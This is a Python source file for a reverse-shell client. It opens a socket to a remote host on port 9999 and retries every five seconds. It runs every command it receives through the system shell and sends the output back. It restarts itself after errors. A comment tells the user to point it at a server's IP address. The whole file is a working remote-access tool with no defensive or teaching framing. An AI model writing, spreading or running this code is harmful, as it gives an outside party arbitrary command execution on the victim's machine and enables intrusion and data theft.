import socket
import os  # os + subprocess allow to control the system
import subprocess
import time


def socket_create():
    try:
        global host
        global port
        global s
        s = socket.socket()
        # change this to server's ip address when porting this onto a server
        host = socket.gethostname()
        port = 9999
    except socket.error as msg:
        print(f"Socket creation error: {msg}")


def socket_connect():
    try:
        global host
        global port
        global s
        s.connect((host, port))
    except socket.error as msg:
        print(f"Socket connection error: {msg}")
        time.sleep(5)
        socket_connect()


def receive_commands():
    while True:
        data = s.recv(1024)
        if data[:].decode("utf-8") == "quit":
            s.close()
            break
        if data[:2].decode("utf-8") == "cd":
            try:
                os.chdir(data[3:].decode("utf-8"))
                output_str = f"cd to {str(os.getcwd())}>"
                s.send(str.encode(output_str))
                print(output_str)
            except:
                pass
        elif len(data) > 0:
            try:
                cmd = subprocess.Popen(data[:].decode(
                    "utf-8"), shell=True, stdout=subprocess.PIPE)
                output_byte = cmd.stdout.read()  # + cmd.stderr.read()
                output_str = str(output_byte, "utf-8")
                s.send(str.encode(f"{str(os.getcwd())}> \n {output_str}"))
                print(output_str)
            except:
                output_str = "Command not recognized\n"
                s.send(str.encode(f"{str(os.getcwd())}> \n {output_str}"))
                print(output_str)
        else:
            pass
    s.close()


def main():
    global s
    try:
        socket_create()
        socket_connect()
        receive_commands()
    except:
        print("Error in main")
        time.sleep(5)
    s.close()
    main()


if __name__ == '__main__':
    main()
